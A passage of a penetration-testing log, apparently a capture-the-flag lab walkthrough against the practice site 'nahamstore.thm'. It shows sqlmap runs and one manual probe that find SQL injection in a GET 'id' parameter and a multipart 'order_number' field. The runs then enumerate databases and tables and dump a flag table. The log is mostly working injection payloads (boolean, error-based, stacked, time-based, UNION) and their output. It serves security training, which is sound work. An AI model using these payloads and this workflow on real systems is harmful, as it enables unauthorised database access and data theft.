[*] ending @ 00:14:26 /2023-03-24/

┌──(witty㉿kali)-[~/bug_hunter/SQLiDetector]
└─$ sqlmap -r req_1 --batch -D nahamstore --tables
        ___
       __H__
 ___ ___[(]_____ ___ ___  {1.7.2#stable}
|_ -| . [']     | .'| . |
|___|_  [.]_|_|_|__,|  _|
      |_|V...       |_|   https://sqlmap.org

[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program

[*] starting @ 00:15:12 /2023-03-24/

[00:15:12] [INFO] parsing HTTP request from 'req_1'
Cookie parameter 'token' appears to hold anti-CSRF token. Do you want sqlmap to automatically update it in further requests? [y/N] N
[00:15:13] [INFO] resuming back-end DBMS 'mysql' 
[00:15:13] [INFO] testing connection to the target URL
sqlmap resumed the following injection point(s) from stored session:
---
Parameter: id (GET)
    Type: boolean-based blind
    Title: AND boolean-based blind - WHERE or HAVING clause
    Payload: id=1 AND 3571=3571

    Type: error-based
    Title: MySQL >= 5.6 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (GTID_SUBSET)
    Payload: id=1 AND GTID_SUBSET(CONCAT(0x71766a7071,(SELECT (ELT(6390=6390,1))),0x7176786b71),6390)

    Type: stacked queries
    Title: MySQL >= 5.0.12 stacked queries (comment)
    Payload: id=1;SELECT SLEEP(5)#

    Type: time-based blind
    Title: MySQL >= 5.0.12 AND time-based blind (query SLEEP)
    Payload: id=1 AND (SELECT 9901 FROM (SELECT(SLEEP(5)))rdMW)

    Type: UNION query
    Title: Generic UNION query (NULL) - 5 columns
    Payload: id=-7146 UNION ALL SELECT NULL,NULL,NULL,CONCAT(0x71766a7071,0x6d4f4d437148694a63766e48616579506763727353514f666a44706571695478794f455361736e50,0x7176786b71),NULL-- -
---
[00:15:13] [INFO] the back-end DBMS is MySQL
web server operating system: Linux Ubuntu
web application technology: Nginx 1.14.0
back-end DBMS: MySQL >= 5.6
[00:15:13] [INFO] fetching tables for database: 'nahamstore'
you provided a HTTP Cookie header value, while target URL provides its own cookies within HTTP Set-Cookie header which intersect with yours. Do you want to merge them in further requests? [Y/n] Y
Database: nahamstore
[2 tables]
+----------+
| product  |
| sqli_one |
+----------+

[00:15:14] [INFO] fetched data logged to text files under '/home/witty/.local/share/sqlmap/output/nahamstore.thm'

[*] ending @ 00:15:14 /2023-03-24/

┌──(witty㉿kali)-[~/bug_hunter/SQLiDetector]
└─$ sqlmap -r req_1 --batch -D nahamstore -T sqli_one --columns
        ___
       __H__
 ___ ___[,]_____ ___ ___  {1.7.2#stable}
|_ -| . [.]     | .'| . |
|___|_  ["]_|_|_|__,|  _|
      |_|V...       |_|   https://sqlmap.org

[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program

[*] starting @ 00:16:03 /2023-03-24/

[00:16:03] [INFO] parsing HTTP request from 'req_1'
Cookie parameter 'token' appears to hold anti-CSRF token. Do you want sqlmap to automatically update it in further requests? [y/N] N
[00:16:04] [INFO] resuming back-end DBMS 'mysql' 
[00:16:04] [INFO] testing connection to the target URL
sqlmap resumed the following injection point(s) from stored session:
---
Parameter: id (GET)
    Type: boolean-based blind
    Title: AND boolean-based blind - WHERE or HAVING clause
    Payload: id=1 AND 3571=3571

    Type: error-based
    Title: MySQL >= 5.6 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (GTID_SUBSET)
    Payload: id=1 AND GTID_SUBSET(CONCAT(0x71766a7071,(SELECT (ELT(6390=6390,1))),0x7176786b71),6390)

    Type: stacked queries
    Title: MySQL >= 5.0.12 stacked queries (comment)
    Payload: id=1;SELECT SLEEP(5)#

    Type: time-based blind
    Title: MySQL >= 5.0.12 AND time-based blind (query SLEEP)
    Payload: id=1 AND (SELECT 9901 FROM (SELECT(SLEEP(5)))rdMW)

    Type: UNION query
    Title: Generic UNION query (NULL) - 5 columns
    Payload: id=-7146 UNION ALL SELECT NULL,NULL,NULL,CONCAT(0x71766a7071,0x6d4f4d437148694a63766e48616579506763727353514f666a44706571695478794f455361736e50,0x7176786b71),NULL-- -
---
[00:16:04] [INFO] the back-end DBMS is MySQL
web server operating system: Linux Ubuntu
web application technology: Nginx 1.14.0
back-end DBMS: MySQL >= 5.6
[00:16:04] [INFO] fetching columns for table 'sqli_one' in database 'nahamstore'
you provided a HTTP Cookie header value, while target URL provides its own cookies within HTTP Set-Cookie header which intersect with yours. Do you want to merge them in further requests? [Y/n] Y
Database: nahamstore
Table: sqli_one
[2 columns]
+--------+-------------+
| Column | Type        |
+--------+-------------+
| flag   | varchar(34) |
| id     | int         |
+--------+-------------+

[00:16:04] [INFO] fetched data logged to text files under '/home/witty/.local/share/sqlmap/output/nahamstore.thm'

[*] ending @ 00:16:04 /2023-03-24/

┌──(witty㉿kali)-[~/bug_hunter/SQLiDetector]
└─$ sqlmap -r req_1 --batch -D nahamstore -T sqli_one --dump   
        ___
       __H__
 ___ ___[']_____ ___ ___  {1.7.2#stable}
|_ -| . [)]     | .'| . |
|___|_  [']_|_|_|__,|  _|
      |_|V...       |_|   https://sqlmap.org

[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program

[*] starting @ 00:16:19 /2023-03-24/

[00:16:19] [INFO] parsing HTTP request from 'req_1'
Cookie parameter 'token' appears to hold anti-CSRF token. Do you want sqlmap to automatically update it in further requests? [y/N] N
[00:16:20] [INFO] resuming back-end DBMS 'mysql' 
[00:16:20] [INFO] testing connection to the target URL
sqlmap resumed the following injection point(s) from stored session:
---
Parameter: id (GET)
    Type: boolean-based blind
    Title: AND boolean-based blind - WHERE or HAVING clause
    Payload: id=1 AND 3571=3571

    Type: error-based
    Title: MySQL >= 5.6 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (GTID_SUBSET)
    Payload: id=1 AND GTID_SUBSET(CONCAT(0x71766a7071,(SELECT (ELT(6390=6390,1))),0x7176786b71),6390)

    Type: stacked queries
    Title: MySQL >= 5.0.12 stacked queries (comment)
    Payload: id=1;SELECT SLEEP(5)#

    Type: time-based blind
    Title: MySQL >= 5.0.12 AND time-based blind (query SLEEP)
    Payload: id=1 AND (SELECT 9901 FROM (SELECT(SLEEP(5)))rdMW)

    Type: UNION query
    Title: Generic UNION query (NULL) - 5 columns
    Payload: id=-7146 UNION ALL SELECT NULL,NULL,NULL,CONCAT(0x71766a7071,0x6d4f4d437148694a63766e48616579506763727353514f666a44706571695478794f455361736e50,0x7176786b71),NULL-- -
---
[00:16:20] [INFO] the back-end DBMS is MySQL
web server operating system: Linux Ubuntu
web application technology: Nginx 1.14.0
back-end DBMS: MySQL >= 5.6
[00:16:20] [INFO] fetching columns for table 'sqli_one' in database 'nahamstore'
[00:16:20] [INFO] fetching entries for table 'sqli_one' in database 'nahamstore'
you provided a HTTP Cookie header value, while target URL provides its own cookies within HTTP Set-Cookie header which intersect with yours. Do you want to merge them in further requests? [Y/n] Y
Database: nahamstore
Table: sqli_one
[1 entry]
+----+------------------------------------+
| id | flag                               |
+----+------------------------------------+
| 1  | {d890234e20be48ff96a2f9caab0de55c} |
+----+------------------------------------+

[00:16:21] [INFO] table 'nahamstore.sqli_one' dumped to CSV file '/home/witty/.local/share/sqlmap/output/nahamstore.thm/dump/nahamstore/sqli_one.csv'
[00:16:21] [INFO] fetched data logged to text files under '/home/witty/.local/share/sqlmap/output/nahamstore.thm'

[*] ending @ 00:16:21 /2023-03-24/


now finding another sqli

-----------------------------146320265839157975802094687199

Content-Disposition: form-data; name="order_number"



1;SELECT SLEEP(5)#

-----------------------------146320265839157975802094687199

Content-Disposition: form-data; name="return_reason"



1

-----------------------------146320265839157975802094687199

Content-Disposition: form-data; name="return_info"



1

-----------------------------146320265839157975802094687199--

HTTP/1.1 302 Found

Server: nginx/1.14.0 (Ubuntu)

Date: Fri, 24 Mar 2023 04:25:27 GMT

Content-Type: text/html; charset=UTF-8

Connection: close

Set-Cookie: session=a2c6214754a5486e6d953d76919a1e7c; expires=Fri, 24-Mar-2023 05:25:22 GMT; Max-Age=3600; path=/

Location: /returns/167?auth=5878a7ab84fb43402106c575658472fa

Content-Length: 0


after 5 seconds so is blind 


┌──(witty㉿kali)-[~/bug_hunter/SQLiDetector]
└─$ cat req_2               
POST /returns HTTP/1.1
Host: nahamstore.thm
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:102.0) Gecko/20100101 Firefox/102.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Content-Type: multipart/form-data; boundary=---------------------------146320265839157975802094687199
Content-Length: 420
Origin: http://nahamstore.thm
Connection: close
Referer: http://nahamstore.thm/returns
Cookie: token=f7dc5...; session=a2c...
Upgrade-Insecure-Requests: 1

-----------------------------146320265839157975802094687199
Content-Disposition: form-data; name="order_number"

1
-----------------------------146320265839157975802094687199
Content-Disposition: form-data; name="return_reason"

1
-----------------------------146320265839157975802094687199
Content-Disposition: form-data; name="return_info"

1
-----------------------------146320265839157975802094687199--


┌──(witty㉿kali)-[~/bug_hunter/SQLiDetector]
└─$ sqlmap -r req_2 --batch                                    
        ___
       __H__
 ___ ___[']_____ ___ ___  {1.7.2#stable}
|_ -| . [']     | .'| . |
|___|_  [,]_|_|_|__,|  _|
      |_|V...       |_|   https://sqlmap.org

[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program

[*] starting @ 00:21:54 /2023-03-24/

[00:21:54] [INFO] parsing HTTP request from 'req_2'
Multipart-like data found in POST body. Do you want to process it? [Y/n/q] Y
Cookie parameter 'token' appears to hold anti-CSRF token. Do you want sqlmap to automatically update it in further requests? [y/N] N
[00:21:55] [INFO] testing connection to the target URL
got a 302 redirect to 'http://nahamstore.thm:80/returns/5?auth=e4da3b7fbbce2345d7772b0674a318d5'. Do you want to follow? [Y/n] Y
redirect is a result of a POST request. Do you want to resend original POST data to a new location? [Y/n] Y
[00:21:56] [INFO] testing if the target URL content is stable
you provided a HTTP Cookie header value, while target URL provides its own cookies within HTTP Set-Cookie header which intersect with yours. Do you want to merge them in further requests? [Y/n] Y
[00:21:56] [WARNING] (custom) POST parameter 'MULTIPART order_number' does not appear to be dynamic
[00:21:56] [WARNING] heuristic (basic) test shows that (custom) POST parameter 'MULTIPART order_number' might not be injectable
[00:21:57] [INFO] testing for SQL injection on (custom) POST parameter 'MULTIPART order_number'
[00:21:57] [INFO] testing 'AND boolean-based blind - WHERE or HAVING clause'
[00:21:58] [INFO] (custom) POST parameter 'MULTIPART order_number' appears to be 'AND boolean-based blind - WHERE or HAVING clause' injectable 
[00:22:03] [INFO] heuristic (extended) test shows that the back-end DBMS could be 'MySQL' 
it looks like the back-end DBMS is 'MySQL'. Do you want to skip test payloads specific for other DBMSes? [Y/n] Y
for the remaining tests, do you want to include all tests for 'MySQL' extending provided level (1) and risk (1) values? [Y/n] Y
[00:22:03] [INFO] testing 'MySQL >= 5.5 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (BIGINT UNSIGNED)'
[00:22:03] [INFO] testing 'MySQL >= 5.5 OR error-based - WHERE or HAVING clause (BIGINT UNSIGNED)'
[00:22:03] [INFO] testing 'MySQL >= 5.5 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (EXP)'
[00:22:04] [INFO] testing 'MySQL >= 5.5 OR error-based - WHERE or HAVING clause (EXP)'
[00:22:04] [INFO] testing 'MySQL >= 5.6 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (GTID_SUBSET)'
[00:22:04] [INFO] testing 'MySQL >= 5.6 OR error-based - WHERE or HAVING clause (GTID_SUBSET)'
[00:22:04] [INFO] testing 'MySQL >= 5.7.8 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (JSON_KEYS)'
[00:22:05] [INFO] testing 'MySQL >= 5.7.8 OR error-based - WHERE or HAVING clause (JSON_KEYS)'
[00:22:05] [INFO] testing 'MySQL >= 5.0 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (FLOOR)'
[00:22:05] [INFO] testing 'MySQL >= 5.0 OR error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (FLOOR)'
[00:22:05] [INFO] testing 'MySQL >= 5.1 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (EXTRACTVALUE)'
[00:22:05] [INFO] testing 'MySQL >= 5.1 OR error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (EXTRACTVALUE)'
[00:22:06] [INFO] testing 'MySQL >= 5.1 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (UPDATEXML)'
[00:22:06] [INFO] testing 'MySQL >= 5.1 OR error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (UPDATEXML)'
[00:22:06] [INFO] testing 'MySQL >= 4.1 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (FLOOR)'
[00:22:06] [INFO] testing 'MySQL >= 4.1 OR error-based - WHERE or HAVING clause (FLOOR)'
[00:22:06] [INFO] testing 'MySQL OR error-based - WHERE or HAVING clause (FLOOR)'
[00:22:07] [INFO] testing 'MySQL >= 5.1 error-based - PROCEDURE ANALYSE (EXTRACTVALUE)'
[00:22:07] [INFO] testing 'MySQL >= 5.5 error-based - Parameter replace (BIGINT UNSIGNED)'
[00:22:07] [INFO] testing 'MySQL >= 5.5 error-based - Parameter replace (EXP)'
[00:22:08] [INFO] testing 'MySQL >= 5.6 error-based - Parameter replace (GTID_SUBSET)'
[00:22:08] [INFO] testing 'MySQL >= 5.7.8 error-based - Parameter replace (JSON_KEYS)'
[00:22:08] [INFO] testing 'MySQL >= 5.0 error-based - Parameter replace (FLOOR)'
[00:22:08] [INFO] testing 'MySQL >= 5.1 error-based - Parameter replace (UPDATEXML)'
[00:22:08] [INFO] testing 'MySQL >= 5.1 error-based - Parameter replace (EXTRACTVALUE)'
[00:22:09] [INFO] testing 'Generic inline queries'
[00:22:09] [INFO] testing 'MySQL inline queries'
[00:22:09] [INFO] testing 'MySQL >= 5.0.12 stacked queries (comment)'
[00:22:20] [INFO] (custom) POST parameter 'MULTIPART order_number' appears to be 'MySQL >= 5.0.12 stacked queries (comment)' injectable 
[00:22:20] [INFO] testing 'MySQL >= 5.0.12 AND time-based blind (query SLEEP)'
[00:22:31] [INFO] (custom) POST parameter 'MULTIPART order_number' appears to be 'MySQL >= 5.0.12 AND time-based blind (query SLEEP)' injectable 
[00:22:31] [INFO] testing 'Generic UNION query (NULL) - 1 to 20 columns'
[00:22:31] [INFO] automatically extending ranges for UNION query injection technique tests as there is at least one other (potential) technique found
[00:22:31] [INFO] 'ORDER BY' technique appears to be usable. This should reduce the time needed to find the right number of query columns. Automatically extending the range for current UNION query injection technique test
[00:22:32] [INFO] target URL appears to have 7 columns in query
do you want to (re)try to find proper UNION column types with fuzzy test? [y/N] N
injection not exploitable with NULL values. Do you want to try with a random integer value for option '--union-char'? [Y/n] Y
[00:22:45] [WARNING] if UNION based SQL injection is not detected, please consider forcing the back-end DBMS (e.g. '--dbms=mysql') 
[00:22:49] [INFO] target URL appears to be UNION injectable with 7 columns
injection not exploitable with NULL values. Do you want to try with a random integer value for option '--union-char'? [Y/n] Y
[00:23:01] [INFO] testing 'MySQL UNION query (61) - 1 to 20 columns'
[00:23:12] [INFO] testing 'MySQL UNION query (61) - 21 to 40 columns'
[00:23:17] [INFO] testing 'MySQL UNION query (61) - 41 to 60 columns'
[00:23:21] [INFO] testing 'MySQL UNION query (61) - 61 to 80 columns'
[00:23:26] [INFO] testing 'MySQL UNION query (61) - 81 to 100 columns'
[00:23:30] [INFO] checking if the injection point on (custom) POST parameter 'MULTIPART order_number' is a false positive
(custom) POST parameter 'MULTIPART order_number' is vulnerable. Do you want to keep testing the others (if any)? [y/N] N
sqlmap identified the following injection point(s) with a total of 331 HTTP(s) requests:
---
Parameter: MULTIPART order_number ((custom) POST)
    Type: boolean-based blind
    Title: AND boolean-based blind - WHERE or HAVING clause
    Payload: -----------------------------146320265839157975802094687199
Content-Disposition: form-data; name="order_number"

1 AND 9631=9631
-----------------------------146320265839157975802094687199
Content-Disposition: form-data; name="return_reason"

1
-----------------------------146320265839157975802094687199
Content-Disposition: form-data; name="return_info"

1
-----------------------------146320265839157975802094687199--

    Type: stacked queries
    Title: MySQL >= 5.0.12 stacked queries (comment)
    Payload: -----------------------------146320265839157975802094687199
Content-Disposition: form-data; name="order_number"

1;SELECT SLEEP(5)#
-----------------------------146320265839157975802094687199
Content-Disposition: form-data; name="return_reason"

1
-----------------------------146320265839157975802094687199
Content-Disposition: form-data; name="return_info"

1
-----------------------------146320265839157975802094687199--

    Type: time-based blind
    Title: MySQL >= 5.0.12 AND time-based blind (query SLEEP)
    Payload: -----------------------------146320265839157975802094687199
Content-Disposition: form-data; name="order_number"

1 AND (SELECT 2178 FROM (SELECT(SLEEP(5)))tJTw)
-----------------------------146320265839157975802094687199
Content-Disposition: form-data; name="return_reason"

1
-----------------------------146320265839157975802094687199
Content-Disposition: form-data; name="return_info"

1
-----------------------------146320265839157975802094687199--
---
[00:23:31] [INFO] the back-end DBMS is MySQL
web server operating system: Linux Ubuntu
web application technology: Nginx 1.14.0
back-end DBMS: MySQL >= 5.0.12
[00:23:32] [INFO] fetched data logged to text files under '/home/witty/.local/share/sqlmap/output/nahamstore.thm'

[*] ending @ 00:23:32 /2023-03-24/

┌──(witty㉿kali)-[~/bug_hunter/SQLiDetector]
└─$ sqlmap -r req_2 --batch --dbs
        ___
       __H__
 ___ ___[.]_____ ___ ___  {1.7.2#stable}
|_ -| . [']     | .'| . |
|___|_  [']_|_|_|__,|  _|
      |_|V...       |_|   https://sqlmap.org

[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program

[*] starting @ 00:26:30 /2023-03-24/

[00:26:30] [INFO] parsing HTTP request from 'req_2'
Multipart-like data found in POST body. Do you want to process it? [Y/n/q] Y
Cookie parameter 'token' appears to hold anti-CSRF token. Do you want sqlmap to automatically update it in further requests? [y/N] N
[00:26:31] [INFO] resuming back-end DBMS 'mysql' 
[00:26:31] [INFO] testing connection to the target URL
got a 302 redirect to 'http://nahamstore.thm:80/returns/168?auth=006f52e9102a8d3be2fe5614f42ba989'. Do you want to follow? [Y/n] Y
redirect is a result of a POST request. Do you want to resend original POST data to a new location? [Y/n] Y
sqlmap resumed the following injection point(s) from stored session:
---
Parameter: MULTIPART order_number ((custom) POST)
    Type: boolean-based blind
    Title: AND boolean-based blind - WHERE or HAVING clause
    Payload: -----------------------------146320265839157975802094687199
Content-Disposition: form-data; name="order_number"

1 AND 9631=9631
-----------------------------146320265839157975802094687199
Content-Disposition: form-data; name="return_reason"

1
-----------------------------146320265839157975802094687199
Content-Disposition: form-data; name="return_info"

1
-----------------------------146320265839157975802094687199--

    Type: stacked queries
    Title: MySQL >= 5.0.12 stacked queries (comment)
    Payload: -----------------------------146320265839157975802094687199
Content-Disposition: form-data; name="order_number"

1;SELECT SLEEP(5)#
-----------------------------146320265839157975802094687199
Content-Disposition: form-data; name="return_reason"

1
-----------------------------146320265839157975802094687199
Content-Disposition: form-data; name="return_info"

1
-----------------------------146320265839157975802094687199--

    Type: time-based blind
    Title: MySQL >= 5.0.12 AND time-based blind (query SLEEP)
    Payload: -----------------------------146320265839157975802094687199
Content-Disposition: form-data; name="order_number"

1 AND (SELECT 2178 FROM (SELECT(SLEEP(5)))tJTw)
-----------------------------146320265839157975802094687199
Content-Disposition: form-data; name="return_reason"

1
-----------------------------146320265839157975802094687199
Content-Disposition: form-data; name="return_info"

1
-----------------------------146320265839157975802094687199--
---
[00:26:31] [INFO] the back-end DBMS is MySQL
web server operating system: Linux Ubuntu
web application technology: Nginx 1.14.0
back-end DBMS: MySQL >= 5.0.12
[00:26:31] [INFO] fetching database names
[00:26:31] [INFO] fetching number of databases
[00:26:31] [WARNING] running in a single-thread mode. Please consider usage of option '--threads' for faster data retrieval
[00:26:31] [INFO] retrieved: 
you provided a HTTP Cookie header value, while target URL provides its own cookies within HTTP Set-Cookie header which intersect with yours. Do you want to merge them in further requests? [Y/n] Y
2
[00:26:33] [INFO] retrieved: information_schema
[00:27:00] [INFO] retrieved: nahamstore
available databases [2]:
[*] information_schema
[*] nahamstore

[00:27:15] [INFO] fetched data logged to text files under '/home/witty/.local/share/sqlmap/output/nahamstore.thm'

[*] ending @ 00:27:15 /2023-03-24/

┌──(witty㉿kali)-[~/bug_hunter/SQLiDetector]
└─$ sqlmap -r req_2 --batch -D nahamstore --tables
        ___
       __H__
 ___ ___[(]_____ ___ ___  {1.7.2#stable}
|_ -| . [)]     | .'| . |
|___|_  [.]_|_|_|__,|  _|
      |_|V...       |_|   https://sqlmap.org

[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program

[*] starting @ 00:27:40 /2023-03-24/

[00:27:40] [INFO] parsing HTTP request from 'req_2'
Multipart-like data found in POST body. Do you want to process it? [Y/n/q] Y
Cookie parameter 'token' appears to hold anti-CSRF token. Do you want sqlmap to automatically update it in further requests? [y/N] N
[00:27:41] [INFO] resuming back-end DBMS 'mysql' 
[00:27:41] [INFO] testing connection to the target URL
got a 302 redirect to 'http://nahamstore.thm:80/returns/258?auth=502e4a16930e414107ee22b6198c578f'. Do you want to follow? [Y/n] Y
redirect is a result of a POST request. Do you want to resend original POST data to a new location? [Y/n] Y
sqlmap resumed the following injection point(s) from stored session:
---
Parameter: MULTIPART order_number ((custom) POST)
    Type: boolean-based blind
    Title: AND boolean-based blind - WHERE or HAVING clause
    Payload: -----------------------------146320265839157975802094687199
Content-Disposition: form-data; name="order_number"

1 AND 9631=9631
-----------------------------146320265839157975802094687199
Content-Disposition: form-data; name="return_reason"

1
-----------------------------146320265839157975802094687199
Content-Disposition: form-data; name="return_info"

1
-----------------------------146320265839157975802094687199--

    Type: stacked queries
    Title: MySQL >= 5.0.12 stacked queries (comment)
    Payload: -----------------------------146320265839157975802094687199
Content-Disposition: form-data; name="order_number"

1;SELECT SLEEP(5)#
-----------------------------146320265839157975802094687199
Content-Disposition: form-data; name="return_reason"

1
-----------------------------146320265839157975802094687199
Content-Disposition: form-data; name="return_info"

1
-----------------------------146320265839157975802094687199--

    Type: time-based blind
    Title: MySQL >= 5.0.12 AND time-based blind (query SLEEP)
    Payload: -----------------------------146320265839157975802094687199
Content-Disposition: form-data; name="order_number"

1 AND (SELECT 2178 FROM (SELECT(SLEEP(5)))tJTw)
-----------------------------146320265839157975802094687199
Content-Disposition: form-data; name="return_reason"

1
-----------------------------146320265839157975802094687199
Content-Disposition: form-data; name="return_info"

1
-----------------------------146320265839157975802094687199--
---
[00:27:41] [INFO] the back-end DBMS is MySQL
web server operating system: Linux Ubuntu
web application technology: Nginx 1.14.0
back-end DBMS: MySQL >= 5.0.12
[00:27:41] [INFO] fetching tables for database: 'nahamstore'
[00:27:41] [INFO] fetching number of tables for database 'nahamstore'
[00:27:41] [WARNING] running in a single-thread mode. Please consider usage of option '--threads' for faster data retrieval
[00:27:41] [INFO] retrieved: 
you provided a HTTP Cookie header value, while target URL provides its own cookies within HTTP Set-Cookie header which intersect with yours. Do you want to merge them in further requests? [Y/n] Y
2
[00:27:43] [INFO] retrieved: order
[00:27:51] [INFO] retrieved: sqli_two
Database: nahamstore
[2 tables]
+----------+
| order    |
| sqli_two |
+----------+

[00:28:04] [INFO] fetched data logged to text files under '/home/witty/.local/share/sqlmap/output/nahamstore.thm'

[*] ending @ 00:28:04 /2023-03-24/

┌──(witty㉿kali)-[~/bug_hunter/SQLiDetector]
└─$ sqlmap -r req_2 --batch -D nahamstore -T sqli_two --columns
        ___
       __H__
 ___ ___[.]_____ ___ ___  {1.7.2#stable}
|_ -| . [)]     | .'| . |
|___|_  [.]_|_|_|__,|  _|
      |_|V...       |_|   https://sqlmap.org

[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program

[*] starting @ 00:28:57 /2023-03-24/

[00:28:57] [INFO] parsing HTTP request from 'req_2'
Multipart-like data found in POST body. Do you want to process it? [Y/n/q] Y
Cookie parameter 'token' appears to hold anti-CSRF token. Do you want sqlmap to automatically update it in further requests? [y/N] N
[00:28:58] [INFO] resuming back-end DBMS 'mysql' 
[00:28:58] [INFO] testing connection to the target URL
got a 302 redirect to 'http://nahamstore.thm:80/returns/308?auth=a8c88a0055f636e4a163a5e3d16adab7'. Do you want to follow? [Y/n] Y
redirect is a result of a POST request. Do you want to resend original POST data to a new location? [Y/n] Y
sqlmap resumed the following injection point(s) from stored session:
---
Parameter: MULTIPART order_number ((custom) POST)
    Type: boolean-based blind
    Title: AND boolean-based blind - WHERE or HAVING clause
    Payload: -----------------------------146320265839157975802094687199
Content-Disposition: form-data; name="order_number"

1 AND 9631=9631
-----------------------------146320265839157975802094687199
Content-Disposition: form-data; name="return_reason"

1
-----------------------------146320265839157975802094687199
Content-Disposition: form-data; name="return_info"

1
-----------------------------146320265839157975802094687199--

    Type: stacked queries
    Title: MySQL >= 5.0.12 stacked queries (comment)
    Payload: -----------------------------146320265839157975802094687199
Content-Disposition: form-data; name="order_number"

1;SELECT SLEEP(5)#
-----------------------------146320265839157975802094687199
Content-Disposition: form-data; name="return_reason"

1
-----------------------------146320265839157975802094687199
Content-Disposition: form-data; name="return_info"

1
-----------------------------146320265839157975802094687199--

    Type: time-based blind
    Title: MySQL >= 5.0.12 AND time-based blind (query SLEEP)
    Payload: -----------------------------146320265839157975802094687199
Content-Disposition: form-data; name="order_number"

1 AND (SELECT 2178 FROM (SELECT(SLEEP(5)))tJTw)
-----------------------------146320265839157975802094687199
Content-Disposition: form-data; name="return_reason"

1
-----------------------------146320265839157975802094687199
Content-Disposition: form-data; name="return_info"

1
-----------------------------146320265839157975802094687199--
---
[00:28:58] [INFO] the back-end DBMS is MySQL
web server operating system: Linux Ubuntu
web application technology: Nginx 1.14.0
back-end DBMS: MySQL >= 5.0.12
[00:28:58] [INFO] fetching columns for table 'sqli_two' in database 'nahamstore'
[00:28:58] [WARNING] running in a single-thread mode. Please consider usage of option '--threads' for faster data retrieval
[00:28:58] [INFO] retrieved: 
you provided a HTTP Cookie header value, while target URL provides its own cookies within HTTP Set-Cookie header which intersect with yours. Do you want to merge them in further requests? [Y/n] Y
2
[00:29:00] [INFO] retrieved: id
[00:29:04] [INFO] retrieved: int
[00:29:08] [INFO] retrieved: flag
[00:29:14] [INFO] retrieved: varchar(34)
Database: nahamstore
Table: sqli_two
[2 columns]
+--------+-------------+
| Column | Type        |
+--------+-------------+
| flag   | varchar(34) |
| id     | int         |
+--------+-------------+

[00:29:32] [INFO] fetched data logged to text files under '/home/witty/.local/share/sqlmap/output/nahamstore.thm'

[*] ending @ 00:29:32 /2023-03-24/

                                                                                                                   
┌──(witty㉿kali)-[~/bug_hunter/SQLiDetector]
└─$ sqlmap -r req_2 --batch -D nahamstore -T sqli_two --dump   
        ___
       __H__
 ___ ___[']_____ ___ ___  {1.7.2#stable}
|_ -| . ["]     | .'| . |
|___|_  [)]_|_|_|__,|  _|
      |_|V...       |_|   https://sqlmap.org

[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program

[*] starting @ 00:29:39 /2023-03-24/

[00:29:39] [INFO] parsing HTTP request from 'req_2'
Multipart-like data found in POST body. Do you want to process it? [Y/n/q] Y
Cookie parameter 'token' appears to hold anti-CSRF token. Do you want sqlmap to automatically update it in further requests? [y/N] N
[00:29:40] [INFO] resuming back-end DBMS 'mysql' 
[00:29:40] [INFO] testing connection to the target URL
got a 302 redirect to 'http://nahamstore.thm:80/returns/376?auth=142949df56ea8ae0be8b5306971900a4'. Do you want to follow? [Y/n] Y
redirect is a result of a POST request. Do you want to resend original POST data to a new location? [Y/n] Y
sqlmap resumed the following injection point(s) from stored session:
---
Parameter: MULTIPART order_number ((custom) POST)
    Type: boolean-based blind
    Title: AND boolean-based blind - WHERE or HAVING clause
    Payload: -----------------------------146320265839157975802094687199
Content-Disposition: form-data; name="order_number"

1 AND 9631=9631
-----------------------------146320265839157975802094687199
Content-Disposition: form-data; name="return_reason"

1
-----------------------------146320265839157975802094687199
Content-Disposition: form-data; name="return_info"

1
-----------------------------146320265839157975802094687199--

    Type: stacked queries
    Title: MySQL >= 5.0.12 stacked queries (comment)
    Payload: -----------------------------146320265839157975802094687199
Content-Disposition: form-data; name="order_number"

1;SELECT SLEEP(5)#
-----------------------------146320265839157975802094687199
Content-Disposition: form-data; name="return_reason"

1
-----------------------------146320265839157975802094687199
Content-Disposition: form-data; name="return_info"

1
-----------------------------146320265839157975802094687199--

    Type: time-based blind
    Title: MySQL >= 5.0.12 AND time-based blind (query SLEEP)
    Payload: -----------------------------146320265839157975802094687199
Content-Disposition: form-data; name="order_number"

1 AND (SELECT 2178 FROM (SELECT(SLEEP(5)))tJTw)
-----------------------------146320265839157975802094687199
Content-Disposition: form-data; name="return_reason"

1
-----------------------------146320265839157975802094687199
Content-Disposition: form-data; name="return_info"

